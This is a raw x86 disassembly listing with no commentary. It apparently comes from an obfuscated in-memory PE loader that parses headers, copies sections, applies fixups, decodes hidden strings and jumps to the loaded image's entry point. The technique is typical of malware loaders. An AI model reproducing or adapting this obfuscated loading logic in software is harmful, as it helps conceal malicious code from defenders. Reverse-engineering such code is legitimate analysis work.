  418557:	mov    eax,DWORD PTR [ebp+0x8]
  41855a:	test   eax,eax
  41855c:	je     0x4189b7
  418562:	mov    eax,DWORD PTR [ebp+0xc]
  418565:	test   eax,eax
  418567:	je     0x4189b7
  41856d:	mov    eax,DWORD PTR [ebp+0x18]
  418570:	test   eax,eax
  418572:	je     0x4189b7
  418578:	mov    ax,WORD PTR [ebp+0x20]
  41857c:	mov    ecx,0x8a8d
  418581:	xor    ax,cx
  418584:	mov    ecx,0x3b51
  418589:	add    ax,cx
  41858c:	mov    ecx,DWORD PTR [ebp+0x8]
  41858f:	cmp    WORD PTR [ecx],ax
  418592:	jne    0x4189b7
  418598:	mov    eax,DWORD PTR [ebp-0x4]
  41859b:	xor    eax,esi
  41859d:	add    eax,edi
  41859f:	mov    DWORD PTR [ebp-0x30],eax
  4185a2:	mov    eax,DWORD PTR [ebp-0x4]
  4185a5:	mov    ecx,DWORD PTR [ebp+0x8]
  4185a8:	mov    eax,DWORD PTR [ebp+0x8]
  4185ab:	add    eax,DWORD PTR [ecx+0x3c]
  4185ae:	mov    DWORD PTR [ebp+0xc],eax
  4185b1:	mov    eax,DWORD PTR [eax+0x50]
  4185b4:	test   eax,eax
  4185b6:	je     0x4189b7
  4185bc:	mov    DWORD PTR [ebp-0x2c],0xf88c8585
  4185c3:	mov    eax,DWORD PTR [ebp-0x2c]
  4185c6:	xor    eax,esi
  4185c8:	add    eax,edi
  4185ca:	mov    DWORD PTR [ebp-0x2c],eax
  4185cd:	mov    eax,DWORD PTR [ebp-0x4]
  4185d0:	mov    eax,DWORD PTR [ebx+0x190]
  4185d6:	mov    ecx,DWORD PTR [eax]
  4185d8:	mov    ecx,DWORD PTR [ecx+0x3c]
  4185db:	add    ecx,DWORD PTR [eax]
  4185dd:	mov    eax,DWORD PTR [ebp-0x4]
  4185e0:	mov    eax,DWORD PTR [ebx+0x18c]
  4185e6:	mov    edx,DWORD PTR [eax]
  4185e8:	mov    DWORD PTR [ebp-0x18],ecx
  4185eb:	mov    DWORD PTR [ebp+0x20],edx
  4185ee:	cmp    edx,edx
  4185f0:	jne    0x418624
  4185f2:	mov    eax,DWORD PTR [ebx+0x1d8]
  4185f8:	lea    edx,[ebp-0x1c]
  4185fb:	push   edx
  4185fc:	mov    edx,DWORD PTR [ebp-0xc]
  4185ff:	xor    edx,esi
  418601:	add    edx,edi
  418603:	push   edx
  418604:	push   DWORD PTR [ecx+0x50]
  418607:	push   DWORD PTR [ebp+0x20]
  41860a:	call   DWORD PTR [eax+0x1c]
  41860d:	mov    eax,DWORD PTR [ebp-0x18]
  418610:	mov    ecx,DWORD PTR [eax+0x54]
  418613:	mov    eax,DWORD PTR [eax+0x50]
  418616:	sub    eax,ecx
  418618:	add    ecx,DWORD PTR [ebp+0x20]
  41861b:	push   ecx
  41861c:	call   0x418fa3
  418621:	mov    edx,DWORD PTR [ebp+0x20]
  418624:	mov    eax,DWORD PTR [ebx+0x194]
  41862a:	mov    DWORD PTR [eax],edx
  41862c:	mov    eax,DWORD PTR [ebp+0xc]
  41862f:	push   DWORD PTR [eax+0x54]
  418632:	push   DWORD PTR [ebp+0x8]
  418635:	push   edx
  418636:	call   0x418e4a
  41863b:	mov    ecx,DWORD PTR [ebp+0x20]
  41863e:	mov    eax,DWORD PTR [ecx+0x3c]
  418641:	add    eax,ecx
  418643:	movzx  ecx,WORD PTR [eax+0x14]
  418647:	lea    ecx,[ecx+eax*1+0x18]
  41864b:	mov    DWORD PTR [ebp+0x18],ecx
  41864e:	mov    ecx,DWORD PTR [ebp-0x4]
  418651:	movzx  edx,WORD PTR [eax+0x6]
  418655:	xor    ecx,esi
  418657:	add    ecx,edi
  418659:	mov    DWORD PTR [ebp+0xc],eax
  41865c:	cmp    edx,ecx
  41865e:	je     0x41870b
  418664:	mov    ecx,DWORD PTR [ebp-0x4]
  418667:	xor    ecx,esi
  418669:	add    ecx,edi
  41866b:	mov    DWORD PTR [ebp-0x8],ecx
  41866e:	mov    ecx,DWORD PTR [ebp-0x24]
  418671:	movzx  edx,WORD PTR [eax+0x6]
  418675:	xor    ecx,esi
  418677:	sub    edx,ecx
  418679:	sub    edx,edi
  41867b:	cmp    DWORD PTR [ebp-0x8],edx
  41867e:	ja     0x41870b
  418684:	mov    edx,DWORD PTR [ebp+0x18]
  418687:	add    edx,0x8
  41868a:	mov    DWORD PTR [ebp+0x18],edx
  41868d:	jmp    0x418692
  41868f:	mov    edx,DWORD PTR [ebp+0x18]
  418692:	mov    eax,DWORD PTR [eax+0x38]
  418695:	lea    ecx,[eax-0x1]
  418698:	mov    DWORD PTR [ebp-0x34],eax
  41869b:	mov    eax,DWORD PTR [edx]
  41869d:	test   ecx,eax
  41869f:	je     0x4186a8
  4186a1:	not    ecx
  4186a3:	and    eax,ecx
  4186a5:	add    eax,DWORD PTR [ebp-0x34]
  4186a8:	mov    ecx,DWORD PTR [edx+0x4]
  4186ab:	add    ecx,DWORD PTR [ebp+0x20]
  4186ae:	push   ecx
  4186af:	call   0x418fa3
  4186b4:	mov    edx,DWORD PTR [ebp-0x4]
  4186b7:	mov    eax,DWORD PTR [ebp+0x18]
  4186ba:	mov    ecx,DWORD PTR [eax+0x8]
  4186bd:	xor    edx,esi
  4186bf:	add    edx,edi
  4186c1:	cmp    ecx,edx
  4186c3:	je     0x4186dc
  4186c5:	push   ecx
  4186c6:	mov    ecx,DWORD PTR [ebp+0x8]
  4186c9:	add    ecx,DWORD PTR [eax+0xc]
  4186cc:	mov    eax,DWORD PTR [eax+0x4]
  4186cf:	add    eax,DWORD PTR [ebp+0x20]
  4186d2:	push   ecx
  4186d3:	push   eax
  4186d4:	call   0x418e4a
  4186d9:	mov    eax,DWORD PTR [ebp+0x18]
  4186dc:	mov    ecx,DWORD PTR [ebp-0x24]
  4186df:	mov    edx,DWORD PTR [ebp-0x8]
  4186e2:	add    eax,0x28
  4186e5:	xor    ecx,esi
  4186e7:	lea    ecx,[edx+ecx*1+0x3272e2]
  4186ee:	mov    edx,DWORD PTR [ebp+0xc]
  4186f1:	mov    DWORD PTR [ebp+0x18],eax
  4186f4:	mov    eax,DWORD PTR [ebp-0x24]
  4186f7:	movzx  edx,WORD PTR [edx+0x6]
  4186fb:	xor    eax,esi
  4186fd:	sub    edx,eax
  4186ff:	mov    eax,DWORD PTR [ebp+0xc]
  418702:	sub    edx,edi
  418704:	mov    DWORD PTR [ebp-0x8],ecx
  418707:	cmp    ecx,edx
  418709:	jbe    0x41868f
  41870b:	mov    edx,DWORD PTR [ebx+0x18c]
  418711:	mov    ecx,DWORD PTR [ebp+0x20]
  418714:	cmp    ecx,DWORD PTR [edx]
  418716:	jne    0x41873f
  418718:	mov    eax,DWORD PTR [ebx+0x1d8]
  41871e:	lea    edx,[ebp-0x1c]
  418721:	push   edx
  418722:	mov    edx,DWORD PTR [ebp-0x10]
  418725:	xor    edx,esi
  418727:	add    edx,edi
  418729:	push   edx
  41872a:	mov    edx,DWORD PTR [ebp-0x18]
  41872d:	push   DWORD PTR [edx+0x54]
  418730:	push   ecx
  418731:	call   DWORD PTR [eax+0x1c]
  418734:	test   eax,eax
  418736:	je     0x4189a8
  41873c:	mov    eax,DWORD PTR [ebp+0xc]
  41873f:	mov    ecx,DWORD PTR [ebx+0x1c8]
  418745:	mov    ecx,DWORD PTR [ecx]
  418747:	xor    ecx,esi
  418749:	add    ecx,edi
  41874b:	je     0x4188d3
  418751:	and    DWORD PTR [ebp-0x28],0x0
  418755:	and    DWORD PTR [ebp+0x8],0x0
  418759:	mov    eax,0xf89c8519
  41875e:	lea    ecx,[eax-0x8]
  418761:	mov    DWORD PTR [ebp-0x4c],0xf89c8517
  418768:	mov    DWORD PTR [ebp-0x48],0xf89c8509
  41876f:	mov    DWORD PTR [ebp-0x44],eax
  418772:	mov    DWORD PTR [ebp-0x40],ecx
  418775:	mov    DWORD PTR [ebp-0x3c],ecx
  418778:	mov    DWORD PTR [ebp-0x38],0xf89c8585
  41877f:	mov    edx,DWORD PTR [ebp+0x8]
  418782:	mov    ecx,0x89b
  418787:	xor    cx,WORD PTR [ebp+edx*4-0x4c]
  41878c:	mov    edx,0x72e2
  418791:	add    cx,dx
  418794:	mov    edx,DWORD PTR [ebp+0x8]
  418797:	inc    DWORD PTR [ebp+0x8]
  41879a:	cmp    DWORD PTR [ebp+0x8],0x6
  41879e:	mov    WORD PTR [ebp+edx*2-0xb4],cx
  4187a6:	jb     0x41877f
  4187a8:	mov    ecx,0xf89c850b
  4187ad:	mov    DWORD PTR [ebp-0xa4],eax
  4187b3:	mov    DWORD PTR [ebp-0x90],eax
  4187b9:	mov    DWORD PTR [ebp-0x68],eax
  4187bc:	mov    DWORD PTR [ebp-0x64],eax
  4187bf:	lea    eax,[ecx-0x1]
  4187c2:	mov    edx,0xf89c85ff
  4187c7:	mov    DWORD PTR [ebp-0x58],eax
  4187ca:	mov    DWORD PTR [ebp-0x54],eax
  4187cd:	mov    DWORD PTR [ebp-0xa8],0xf89c85f1
  4187d7:	mov    DWORD PTR [ebp-0xa0],ecx
  4187dd:	mov    DWORD PTR [ebp-0x9c],edx
  4187e3:	mov    DWORD PTR [ebp-0x98],0xf89c851c
  4187ed:	mov    DWORD PTR [ebp-0x94],0xf89c8517
  4187f7:	mov    DWORD PTR [ebp-0x8c],0xf89c85f8
  418801:	mov    DWORD PTR [ebp-0x88],0xf89c8517
  41880b:	mov    DWORD PTR [ebp-0x84],0xf89c8509
  418815:	mov    DWORD PTR [ebp-0x80],ecx
  418818:	mov    DWORD PTR [ebp-0x7c],0xf89c850c
  41881f:	mov    DWORD PTR [ebp-0x78],edx
  418822:	mov    DWORD PTR [ebp-0x74],0xf89c8516
  418829:	mov    DWORD PTR [ebp-0x70],ecx
  41882c:	mov    DWORD PTR [ebp-0x6c],0xf89c85c4
  418833:	mov    DWORD PTR [ebp-0x60],ecx
  418836:	mov    DWORD PTR [ebp-0x5c],0xf89c8518
  41883d:	mov    DWORD PTR [ebp-0x50],0xf89c8585
  418844:	xor    eax,eax
  418846:	mov    cl,BYTE PTR [ebp+eax*4-0xa8]
  41884d:	xor    cl,0x9b
  418850:	sub    cl,0x1e
  418853:	mov    BYTE PTR [ebp+eax*1-0xcc],cl
  41885a:	inc    eax
  41885b:	cmp    eax,0x17
  41885e:	jb     0x418846
  418860:	mov    eax,DWORD PTR [ebx+0x1d8]
  418866:	lea    ecx,[ebp-0xb4]
  41886c:	push   ecx
  41886d:	call   DWORD PTR [eax+0x4]
  418870:	mov    ecx,DWORD PTR [ebx+0x1d8]
  418876:	lea    edx,[ebp-0xcc]
  41887c:	push   edx
  41887d:	push   eax
  41887e:	call   DWORD PTR [ecx+0x8]
  418881:	lea    ecx,[ebp-0x28]
  418884:	push   ecx
  418885:	mov    ecx,DWORD PTR [ebx+0x18c]
  41888b:	push   DWORD PTR [ecx]
  41888d:	call   eax
  41888f:	mov    eax,DWORD PTR [ebp-0x28]
  418892:	test   eax,eax
  418894:	je     0x4188d0
  418896:	mov    DWORD PTR [ebp+0x8],eax
  418899:	jmp    0x4188a5
  41889b:	mov    eax,DWORD PTR [eax]
  41889d:	mov    DWORD PTR [ebp-0x28],eax
  4188a0:	cmp    eax,DWORD PTR [ebp+0x8]
  4188a3:	je     0x4188b2
  4188a5:	mov    edx,DWORD PTR [eax+0x18]
  4188a8:	mov    ecx,DWORD PTR [ebx+0x18c]
  4188ae:	cmp    edx,DWORD PTR [ecx]
  4188b0:	jne    0x41889b
  4188b2:	mov    edx,DWORD PTR [eax+0x18]
  4188b5:	mov    ecx,DWORD PTR [ebx+0x18c]
  4188bb:	cmp    edx,DWORD PTR [ecx]
  4188bd:	jne    0x4188d0
  4188bf:	mov    edx,DWORD PTR [ebp-0x18]
  4188c2:	mov    ecx,DWORD PTR [ebx+0x190]
  4188c8:	mov    edx,DWORD PTR [edx+0x28]
  4188cb:	add    edx,DWORD PTR [ecx]
  4188cd:	mov    DWORD PTR [eax+0x1c],edx
  4188d0:	mov    eax,DWORD PTR [ebp+0xc]
  4188d3:	push   ebx
  4188d4:	push   eax
  4188d5:	push   DWORD PTR [ebp+0x20]
  4188d8:	call   0x418082
  4188dd:	test   eax,eax
  4188df:	je     0x4189a8
  4188e5:	push   DWORD PTR [ebp+0xc]
  4188e8:	mov    ecx,ebx
  4188ea:	push   DWORD PTR [ebp+0x20]
  4188ed:	call   0x417fdb
  4188f2:	test   eax,eax
  4188f4:	je     0x4189a8
  4188fa:	mov    eax,DWORD PTR [ebp+0xc]
  4188fd:	mov    edx,DWORD PTR [ebp+0x20]
  418900:	mov    ecx,ebx
  418902:	call   0x417eb4
  418907:	test   eax,eax
  418909:	je     0x4189a8
  41890f:	push   ebx
  418910:	push   DWORD PTR [ebp+0x20]
  418913:	call   0x418365
  418918:	test   eax,eax
  41891a:	je     0x4189a8
  418920:	mov    eax,DWORD PTR [ebx+0x18c]
  418926:	mov    edx,DWORD PTR [ebp+0x20]
  418929:	cmp    edx,DWORD PTR [eax]
  41892b:	jne    0x418947
  41892d:	mov    eax,DWORD PTR [ebx+0x1d8]
  418933:	lea    ecx,[ebp-0x1c]
  418936:	push   ecx
  418937:	push   DWORD PTR [ebp-0x1c]
  41893a:	mov    ecx,DWORD PTR [ebp-0x18]
  41893d:	push   DWORD PTR [ecx+0x54]
  418940:	push   edx
  418941:	call   DWORD PTR [eax+0x1c]
  418944:	mov    edx,DWORD PTR [ebp+0x20]
  418947:	mov    eax,DWORD PTR [ebx+0x1c8]
  41894d:	mov    eax,DWORD PTR [eax]
  41894f:	xor    eax,esi
  418951:	add    eax,edi
  418953:	je     0x41898c
  418955:	mov    ecx,DWORD PTR [ebp+0xc]
  418958:	mov    eax,DWORD PTR [ecx+0x28]
  41895b:	mov    DWORD PTR [ebp+0x8],0xf89ca585
  418962:	mov    esi,DWORD PTR [ebp+0x8]
  418965:	push   DWORD PTR [ebp+0x14]
  418968:	xor    esi,0x89b
  41896e:	push   DWORD PTR [ebp+0x10]
  418971:	add    esi,0x72e2
  418977:	or     WORD PTR [ecx+0x16],si
  41897b:	add    eax,edx
  41897d:	push   edx
  41897e:	call   eax
  418980:	mov    DWORD PTR [ebx+0x1d0],0xf89c8584
  41898a:	jmp    0x418996
  41898c:	mov    eax,DWORD PTR [ebp+0xc]
  41898f:	mov    eax,DWORD PTR [eax+0x28]
  418992:	add    eax,edx
  418994:	call   eax
  418996:	mov    DWORD PTR [ebp-0x8],eax
  418999:	mov    eax,DWORD PTR [ebp-0x8]
  41899c:	mov    ecx,DWORD PTR [ebp+0x1c]
  41899f:	mov    DWORD PTR [ecx],eax
  4189a1:	mov    DWORD PTR [ebp-0x30],0x1
  4189a8:	cmp    DWORD PTR [ebp-0x30],0x0
  4189ac:	jne    0x4189b2
  4189ae:	and    DWORD PTR [ebp+0x20],0x0
  4189b2:	mov    eax,DWORD PTR [ebp+0x20]
  4189b5:	jmp    0x4189b9
  4189b7:	xor    eax,eax
  4189b9:	pop    edi
  4189ba:	pop    esi
  4189bb:	pop    ebx
  4189bc:	leave  
  4189bd:	ret    0x1c
  4189c0:	push   ebp
  4189c1:	mov    ebp,esp
  4189c3:	movzx  edx,WORD PTR [ecx+0x6]
  4189c7:	movzx  eax,WORD PTR [ecx+0x14]
  4189cb:	push   ebx
  4189cc:	push   edi
  4189cd:	xor    edi,edi
  4189cf:	lea    eax,[eax+ecx*1+0x18]
  4189d3:	test   edx,edx
  4189d5:	je     0x4189f6
  4189d7:	mov    ecx,DWORD PTR [eax+0xc]
  4189da:	lea    ebx,[ecx+esi*1]
  4189dd:	cmp    DWORD PTR [ebp+0x8],ebx
  4189e0:	jb     0x4189ee
  4189e2:	mov    ebx,DWORD PTR [eax+0x8]
  4189e5:	add    ebx,ecx
  4189e7:	add    ebx,esi
  4189e9:	cmp    DWORD PTR [ebp+0x8],ebx
  4189ec:	jb     0x4189f8
  4189ee:	add    eax,0x28
  4189f1:	inc    edi
  4189f2:	cmp    edi,edx
  4189f4:	jb     0x4189d7
  4189f6:	xor    eax,eax
  4189f8:	pop    edi
  4189f9:	pop    ebx
  4189fa:	pop    ebp
  4189fb:	ret    0x4
  4189fe:	push   ebp
  4189ff:	mov    ebp,esp
  418a01:	sub    esp,0x34
  418a04:	mov    DWORD PTR [ebp-0xc],0xf89c8585
  418a0b:	mov    DWORD PTR [ebp-0x18],0xf89c8584
  418a12:	mov    DWORD PTR [ebp-0x1c],0xf89c85bb
  418a19:	mov    DWORD PTR [ebp-0x8],0xf89c85e4
  418a20:	mov    DWORD PTR [ebp-0x20],0xf89c85c4
  418a27:	mov    DWORD PTR [ebp-0x2c],0xf89c8503
  418a2e:	mov    DWORD PTR [ebp-0x2c],0xf89c85e3
  418a35:	mov    DWORD PTR [ebp-0x10],eax
  418a38:	mov    eax,DWORD PTR [ebp+0x8]
  418a3b:	mov    DWORD PTR [ebp-0x14],eax
  418a3e:	mov    eax,DWORD PTR [ebp-0xc]
  418a41:	push   ebx
  418a42:	mov    ecx,0x751089b
  418a47:	xor    eax,ecx
  418a49:	push   esi
  418a4a:	mov    esi,DWORD PTR [ebp-0x10]
  418a4d:	mov    edx,0x3272e2
  418a52:	add    eax,edx
  418a54:	push   edi
  418a55:	cmp    esi,eax
  418a57:	je     0x418c36
  418a5d:	mov    eax,DWORD PTR [ebp-0xc]
  418a60:	mov    esi,DWORD PTR [ebp-0x14]
  418a63:	xor    eax,ecx
  418a65:	add    eax,edx
  418a67:	cmp    esi,eax
  418a69:	je     0x418c36
  418a6f:	mov    eax,DWORD PTR [ebp-0xc]
  418a72:	xor    eax,ecx
  418a74:	add    eax,edx
  418a76:	mov    DWORD PTR [ebp-0x24],eax
  418a79:	mov    eax,DWORD PTR [ebp-0xc]
  418a7c:	xor    eax,ecx
  418a7e:	add    eax,edx
  418a80:	mov    DWORD PTR [ebp-0x28],eax
  418a83:	mov    edi,DWORD PTR [ebp-0x20]
  418a86:	mov    ebx,DWORD PTR [ebp-0x8]
  418a89:	mov    esi,0x89b
  418a8e:	xor    edi,esi
  418a90:	mov    eax,0x72e2
  418a95:	xor    ebx,esi
  418a97:	add    edi,eax
  418a99:	add    ebx,eax
  418a9b:	sub    ebx,edi
  418a9d:	mov    WORD PTR [ebp-0x8],bx
  418aa1:	jmp    0x418b66
  418aa6:	mov    edi,DWORD PTR [ebp-0xc]
  418aa9:	mov    bx,WORD PTR [ebp-0x4]
  418aad:	xor    edi,esi
  418aaf:	add    edi,eax
  418ab1:	cmp    bx,di
  418ab4:	je     0x418ba8
  418aba:	mov    edi,DWORD PTR [ebp-0xc]
  418abd:	mov    ebx,DWORD PTR [ebp+0xc]
  418ac0:	xor    edi,ecx
  418ac2:	add    edi,edx
  418ac4:	cmp    ebx,edi
  418ac6:	mov    di,WORD PTR [ebp-0x4]
  418aca:	mov    bx,WORD PTR [ebp+0x8]
  418ace:	je     0x418b39
  418ad0:	cmp    bx,di
  418ad3:	je     0x418b42
  418ad5:	mov    edi,DWORD PTR [ebp-0x20]
  418ad8:	mov    bx,WORD PTR [ebp+0x8]
  418adc:	xor    edi,esi
  418ade:	add    edi,eax
  418ae0:	cmp    bx,di
  418ae3:	jb     0x418b03
  418ae5:	mov    edi,DWORD PTR [ebp-0x2c]
  418ae8:	mov    bx,WORD PTR [ebp+0x8]
  418aec:	xor    edi,esi
  418aee:	add    edi,eax
  418af0:	cmp    bx,di
  418af3:	ja     0x418b03
  418af5:	movzx  edi,WORD PTR [ebp+0x8]
  418af9:	movzx  ebx,WORD PTR [ebp-0x8]
  418afd:	add    edi,ebx
  418aff:	mov    WORD PTR [ebp+0x8],di
  418b03:	mov    edi,DWORD PTR [ebp-0x20]
  418b06:	mov    bx,WORD PTR [ebp-0x4]
  418b0a:	xor    edi,esi
  418b0c:	add    edi,eax
  418b0e:	cmp    bx,di
  418b11:	jb     0x418b31
  418b13:	mov    edi,DWORD PTR [ebp-0x2c]
  418b16:	mov    bx,WORD PTR [ebp-0x4]
  418b1a:	xor    edi,esi
  418b1c:	add    edi,eax
  418b1e:	cmp    bx,di
  418b21:	ja     0x418b31
  418b23:	movzx  edi,WORD PTR [ebp-0x4]
  418b27:	movzx  ebx,WORD PTR [ebp-0x8]
  418b2b:	add    edi,ebx
  418b2d:	mov    WORD PTR [ebp-0x4],di
  418b31:	mov    di,WORD PTR [ebp-0x4]
  418b35:	mov    bx,WORD PTR [ebp+0x8]
  418b39:	cmp    bx,di
  418b3c:	jne    0x418c36
  418b42:	mov    edi,DWORD PTR [ebp-0x1c]
  418b45:	mov    ebx,DWORD PTR [ebp-0x10]
  418b48:	xor    edi,ecx
  418b4a:	lea    edi,[edi+ebx*1+0x3272e2]
  418b51:	mov    DWORD PTR [ebp-0x10],edi
  418b54:	mov    edi,DWORD PTR [ebp-0x1c]
  418b57:	mov    ebx,DWORD PTR [ebp-0x14]
  418b5a:	xor    edi,ecx
  418b5c:	lea    edi,[edi+ebx*1+0x3272e2]
  418b63:	mov    DWORD PTR [ebp-0x14],edi
  418b66:	mov    edi,DWORD PTR [ebp-0x24]
  418b69:	mov    ebx,DWORD PTR [ebp-0x10]
  418b6c:	mov    di,WORD PTR [ebx+edi*2]
  418b70:	mov    WORD PTR [ebp+0x8],di
  418b74:	mov    edi,DWORD PTR [ebp-0x28]
  418b77:	mov    ebx,DWORD PTR [ebp-0x14]
  418b7a:	mov    di,WORD PTR [ebx+edi*2]
  418b7e:	mov    WORD PTR [ebp-0x4],di
  418b82:	mov    edi,DWORD PTR [ebp-0xc]
  418b85:	mov    bx,WORD PTR [ebp+0x8]
  418b89:	xor    edi,esi
  418b8b:	add    edi,eax
  418b8d:	cmp    bx,di
  418b90:	jne    0x418aa6
  418b96:	mov    eax,DWORD PTR [ebp-0x18]
  418b99:	mov    esi,DWORD PTR [ebp-0xc]
  418b9c:	xor    eax,ecx
  418b9e:	add    eax,edx
  418ba0:	imul   eax,esi
  418ba3:	mov    DWORD PTR [ebp-0xc],eax
  418ba6:	jmp    0x418bba
  418ba8:	mov    eax,DWORD PTR [ebp-0xc]
  418bab:	mov    esi,DWORD PTR [ebp-0x18]
  418bae:	xor    eax,ecx
  418bb0:	lea    eax,[eax+esi*1+0x3272e2]
  418bb7:	mov    DWORD PTR [ebp-0x18],eax
  418bba:	mov    eax,DWORD PTR [ebp-0x24]
  418bbd:	sub    eax,edx
  418bbf:	xor    eax,ecx
  418bc1:	mov    DWORD PTR [ebp-0x30],eax
  418bc4:	mov    eax,DWORD PTR [ebp-0x28]
  418bc7:	sub    eax,edx
  418bc9:	xor    eax,ecx
  418bcb:	mov    DWORD PTR [ebp-0x34],eax
  418bce:	mov    eax,DWORD PTR [ebp-0x34]
  418bd1:	mov    esi,DWORD PTR [ebp-0x1c]
  418bd4:	xor    esi,ecx
  418bd6:	add    esi,edx
  418bd8:	xor    eax,ecx
  418bda:	add    eax,0x3272e2
  418bdf:	imul   esi,eax
  418be2:	mov    eax,DWORD PTR [ebp-0x14]
  418be5:	movzx  eax,WORD PTR [esi+eax*1]
  418be9:	mov    esi,DWORD PTR [ebp-0x30]
  418bec:	mov    edi,DWORD PTR [ebp-0x1c]
  418bef:	xor    esi,ecx
  418bf1:	add    esi,edx
  418bf3:	xor    edi,ecx
  418bf5:	add    edi,edx
  418bf7:	imul   edi,esi
  418bfa:	mov    esi,DWORD PTR [ebp-0x10]
  418bfd:	movzx  esi,WORD PTR [edi+esi*1]
  418c01:	sub    eax,edx
  418c03:	sub    esi,edx
  418c05:	xor    eax,ecx
  418c07:	xor    esi,ecx
  418c09:	cmp    esi,eax
  418c0b:	jne    0x418c36
  418c0d:	mov    eax,DWORD PTR [ebp-0x30]
  418c10:	mov    esi,DWORD PTR [ebp-0x1c]
  418c13:	xor    eax,ecx
  418c15:	add    eax,0x3272e2
  418c1a:	xor    esi,ecx
  418c1c:	add    esi,edx
  418c1e:	imul   esi,eax
  418c21:	mov    eax,DWORD PTR [ebp-0x10]
  418c24:	movzx  eax,WORD PTR [esi+eax*1]
  418c28:	mov    esi,DWORD PTR [ebp-0xc]
  418c2b:	sub    eax,edx
  418c2d:	xor    eax,ecx
  418c2f:	cmp    eax,esi
  418c31:	mov    eax,DWORD PTR [ebp-0xc]
  418c34:	je     0x418c39
  418c36:	mov    eax,DWORD PTR [ebp-0x18]
  418c39:	pop    edi
  418c3a:	xor    eax,ecx
  418c3c:	pop    esi
  418c3d:	add    eax,edx
  418c3f:	pop    ebx
  418c40:	leave  
  418c41:	ret    0x8
  418c44:	push   ebp
  418c45:	mov    ebp,esp
  418c47:	push   ecx
  418c48:	mov    cx,WORD PTR [eax]
  418c4b:	push   esi
  418c4c:	mov    esi,0x3b51
  418c51:	sub    cx,si
  418c54:	mov    esi,0x8a8d
  418c59:	xor    cx,si
  418c5c:	mov    esi,0x4e22
  418c61:	mov    DWORD PTR [ebp-0x4],0xf89c8586
  418c68:	mov    edx,0xf89c8585
  418c6d:	cmp    cx,si
  418c70:	je     0x418ccf
  418c72:	push   ebx
  418c73:	push   edi
  418c74:	movzx  ecx,cx
  418c77:	mov    edi,0xffcd8d1e
  418c7c:	mov    esi,0x751089b
  418c81:	mov    ebx,0x4f86
  418c86:	cmp    cx,bx
  418c89:	jne    0x418c8e
  418c8b:	mov    DWORD PTR [ebp-0x4],edx
  418c8e:	lea    edx,[edi+0x1]
  418c91:	xor    edx,esi
  418c93:	mov    edi,edx
  418c95:	xor    edi,esi
  418c97:	mov    cx,WORD PTR [eax+edi*2+0x64e5c4]
  418c9f:	mov    ebx,0x3b51
  418ca4:	sub    cx,bx
  418ca7:	mov    ebx,0x8a8d
  418cac:	xor    cx,bx
  418caf:	mov    ebx,0x4e22
  418cb4:	cmp    cx,bx
  418cb7:	jne    0x418c81
  418cb9:	mov    ecx,DWORD PTR [ebp-0x4]
  418cbc:	pop    edi
  418cbd:	pop    ebx
  418cbe:	cmp    ecx,0xf89c8586
  418cc4:	je     0x418ccf
  418cc6:	xor    ecx,esi
  418cc8:	lea    eax,[eax+ecx*2+0x64e5c6]
  418ccf:	pop    esi
  418cd0:	leave  
  418cd1:	ret    
  418cd2:	push   ebp
  418cd3:	mov    ebp,esp
  418cd5:	push   ecx
  418cd6:	push   esi
  418cd7:	push   edi
  418cd8:	mov    DWORD PTR [ebp-0x4],0xf89c8586
  418cdf:	mov    esi,0xf89c8585
  418ce4:	call   0x418c44
  418ce9:	mov    edi,eax
  418ceb:	mov    al,BYTE PTR [edi]
  418ced:	add    al,0x8
  418cef:	xor    al,0x74
  418cf1:	cmp    al,0x7c
  418cf3:	je     0x418d56
  418cf5:	mov    eax,edi
  418cf7:	mov    edx,0xffcd8d1e
  418cfc:	mov    ecx,0x751089b
  418d01:	push   ebx
  418d02:	mov    ax,WORD PTR [eax]
  418d05:	mov    ebx,0x3b51
  418d0a:	sub    ax,bx
  418d0d:	mov    ebx,0x8a8d
  418d12:	xor    ax,bx
  418d15:	mov    ebx,0x4e50
  418d1a:	cmp    ax,bx
  418d1d:	jne    0x418d22
  418d1f:	mov    DWORD PTR [ebp-0x4],esi
  418d22:	lea    esi,[edx+0x1]
  418d25:	xor    esi,ecx
  418d27:	mov    edx,esi
  418d29:	xor    edx,ecx
  418d2b:	lea    eax,[edi+edx*2+0x64e5c4]
  418d32:	mov    bl,BYTE PTR [eax]
  418d34:	add    bl,0x8
  418d37:	xor    bl,0x74
  418d3a:	cmp    bl,0x7c
  418d3d:	jne    0x418d02
  418d3f:	mov    eax,DWORD PTR [ebp-0x4]
  418d42:	pop    ebx
  418d43:	cmp    eax,0xf89c8586
  418d48:	je     0x418d56
  418d4a:	xor    eax,ecx
  418d4c:	xor    ecx,ecx
  418d4e:	mov    WORD PTR [edi+eax*2+0x64e5c4],cx
  418d56:	mov    eax,edi
  418d58:	pop    edi
  418d59:	pop    esi
  418d5a:	leave  
  418d5b:	ret    
  418d5c:	push   ebp
  418d5d:	mov    ebp,esp
  418d5f:	push   ecx
  418d60:	push   esi
  418d61:	mov    DWORD PTR [ebp-0x4],0xf89c8586
  418d68:	mov    esi,0xf89c8585
  418d6d:	call   0x418c44
  418d72:	mov    cx,WORD PTR [eax]
  418d75:	mov    edx,0x3b51
  418d7a:	sub    cx,dx
  418d7d:	mov    edx,0x8a8d
  418d82:	xor    cx,dx
  418d85:	mov    edx,0x4e22
  418d8a:	cmp    cx,dx
  418d8d:	je     0x418de6
  418d8f:	push   ebx
  418d90:	push   edi
  418d91:	movzx  ecx,cx
  418d94:	mov    edx,0xffcd8d1e
  418d99:	mov    edi,0x751089b
  418d9e:	mov    ebx,0x4e50
  418da3:	cmp    cx,bx
  418da6:	jne    0x418dab
  418da8:	mov    DWORD PTR [ebp-0x4],esi
  418dab:	lea    esi,[edx+0x1]
  418dae:	xor    esi,edi
  418db0:	mov    edx,esi
  418db2:	xor    edx,edi
  418db4:	mov    cx,WORD PTR [eax+edx*2+0x64e5c4]
  418dbc:	mov    ebx,0x3b51
  418dc1:	sub    cx,bx
  418dc4:	mov    ebx,0x8a8d
  418dc9:	xor    cx,bx
  418dcc:	mov    ebx,0x4e22
  418dd1:	cmp    cx,bx
  418dd4:	jne    0x418d9e
  418dd6:	cmp    DWORD PTR [ebp-0x4],0xf89c8586
  418ddd:	pop    edi
  418dde:	pop    ebx
  418ddf:	je     0x418de6
  418de1:	xor    eax,eax
  418de3:	inc    eax
  418de4:	jmp    0x418de8
  418de6:	xor    eax,eax
  418de8:	pop    esi
  418de9:	leave  
  418dea:	ret    
  418deb:	push   ebp
  418dec:	mov    ebp,esp
  418dee:	push   ecx
  418def:	mov    eax,DWORD PTR [ebp+0x8]
  418df2:	movzx  ecx,WORD PTR [eax]
  418df5:	push   esi
  418df6:	lea    eax,[ecx-0x3b51]
